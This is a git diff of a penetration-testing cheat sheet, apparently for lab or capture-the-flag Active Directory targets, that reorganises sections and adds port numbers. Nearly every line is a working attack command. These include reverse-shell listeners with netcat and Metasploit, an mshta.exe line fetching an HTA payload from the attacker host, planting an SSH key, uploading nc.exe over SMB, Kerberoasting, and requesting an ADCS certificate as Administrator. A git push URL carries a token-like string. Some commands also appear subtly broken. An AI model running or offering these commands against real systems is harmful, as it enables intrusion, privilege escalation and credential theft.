@@ -117,9 +117,9 @@ bloodhound-python -c default -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -
 # Exploitation
 ## Reverse Shell Listeners
 rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
-nc -lvnp 4444
 rlwrap msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 4444; run"
 rlwrap msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
+nc -lvnp 4444
 
 ## Web
 [*] Reverse Shell
@@ -290,30 +290,14 @@ https://datafetcher.com/graphql-json-body-converter
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
 
 ## Infrastructure
-[*] MSHTA
-msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
-mshta.exe http://$MYIP:8080/nZzLAD.hta
-sessions -i 1
-
-[*] SSH
+[*] (22) SSH
 ssh-keygen -f sshkey -N ''; cat sshkey.pub
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
 ssh-add -D
 $USERNAME@$TARGET -i sshkey.pub
 $USERNAME@$TARGET
 
-[*] SMB
-msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set CreateSession true; run"
-sessions -i 1
-shares -i C$
-cd programdata
-upload nc.exe
-
-impacket-smbclient $DOM/'$USERNAME':'$PASSWORD'@$TARGET
-shares
-use
-
-[*] Kerberos
+[*] (88) Kerberos
 sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
 
 KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
@@ -346,11 +330,22 @@ impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -usersfile usernames -k -no-pass
 impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -request
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
+[*] (445) SMB
+msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set CreateSession true; run"
+sessions -i 1
+shares -i C$
+cd programdata
+upload nc.exe
+
+impacket-smbclient $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+shares
+use
+
 [*] ADCS
 certipy-ad find -u '$USERNAME' -p '$PASSWORD' -dc-ip $TARGET -vulnerable -enabled -stdout
 certipy-ad req -target '$DC' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096' -k -no-pass
 
-[*] RDP
+[*] (3389) RDP
 xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
 xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution +clipboard
 
@@ -388,7 +383,13 @@ export SHELL=bash;
 export TERM=xterm-256color;
 stty rows <num> columns <num>
 reset
+
 ## Windows
+[*] MSHTA
+msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
+mshta.exe http://$MYIP:8080/nZzLAD.hta
+sessions -i 1
+
 [*] Metasploit
 getuid
 getprivs
